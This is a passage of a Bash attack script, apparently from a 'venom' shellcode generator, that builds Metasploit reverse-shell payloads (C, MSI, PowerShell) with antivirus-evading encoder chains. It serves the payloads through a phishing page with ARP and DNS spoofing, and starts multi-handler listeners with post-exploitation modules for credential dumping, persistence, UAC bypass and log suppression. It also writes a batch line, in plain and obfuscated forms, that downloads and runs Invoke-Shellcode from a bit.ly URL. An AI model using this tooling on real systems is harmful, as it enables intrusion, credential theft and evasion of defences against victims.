echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: G0tmi1k" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="G0tmi1k";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
fi

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc4 ]; then
      echo "[☠] exec.rb -> found!"
      sleep 2
   else
      echo "[☠] exec.rb -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc4 $IPATH/templates/exec[bak].rb
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc4 > /dev/null 2>&1
   else
      gedit $InJEc4 > /dev/null 2>&1
   fi


     cd $IPATH/templates
     mv $InJEc4 $IPATH/output/$N4m.rb


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.rb\n\nchose how to deliver: $N4m.rb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.rb|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.rb > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}






# -------------------------------------------
# build shellcode in MSI (windows-platforms)
# and build installer.bat to use in winrar/sfx
# to be executable by pressing on it :D
# -------------------------------------------
sh_shellcode8 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: msiexec" --entry --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="msiexec";fi

echo "[☠] Building shellcode -> msi format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : MSI -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi"
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
fi


echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
echo "[☠] Injecting shellcode -> $N4m.msi!"
sleep 2
# build winrar/SFX installer.bat script
echo "[☠] Building winrar/SFX -> installer.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
echo ":: this script will run payload using msiexec" >> $IPATH/output/installer.bat
echo ":: ---" >> $IPATH/output/installer.bat
echo "@echo off" >> $IPATH/output/installer.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
echo "msiexec /quiet /qn /i $N4m.msi" >> $IPATH/output/installer.bat
echo "exit" >> $IPATH/output/installer.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.msi\n$IPATH/output/installer.bat\n\nExecute on cmd: msiexec /quiet /qn /i $N4m.msi\n\nchose how to deliver: $N4m.msi" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start installer.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.msi|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# --------------------------------------------------------------
# build shellcode powershell <DownloadString> + Invoke-Shellcode
# Matthew Graeber - powershell technics (Invoke-Shellcode)
# --------------------------------------------------------------
sh_shellcode9 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info --width 300 > /dev/null 2>&1
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Graeber" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Graeber";fi

echo "[☠] Building shellcode -> powershell format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw

cd $IPATH/aux
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
rm *.ps1 > /dev/null 2>&1
rm *.vbs > /dev/null 2>&1

# display shellcode
mv *.bat $IPATH/bin/sedding.raw
disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'} | tr -d '\n'`
echo "$disp" > $IPATH/output/chars.raw
echo ""
echo "[☠] shellcode -> powershell encoded!"
sleep 2
echo $disp
echo "" && echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


   # check if template exists
   if [ -e $InJEc8 ]; then
      echo "[☠] InvokePS1.bat -> found!"
      sleep 2
   else
      echo "[☠] InvokePS1.bat -> not found!"
      exit
   fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2


OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp" > $N4m.bat
else
echo "[✔] String obfuscation technic sellected .."
## OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
#
# STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp
echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//bit.ly/14bZZ0'+'c');In^vo%Id%k%Count+8%e-S%$'''d%hel^l%,,;F%cod^e -For%en%ce -Sh%IN%e^ll%oOp%cod^e $disp" > $N4m.bat
fi


#sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
mv $N4m.bat $IPATH/output/$N4m.bat
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
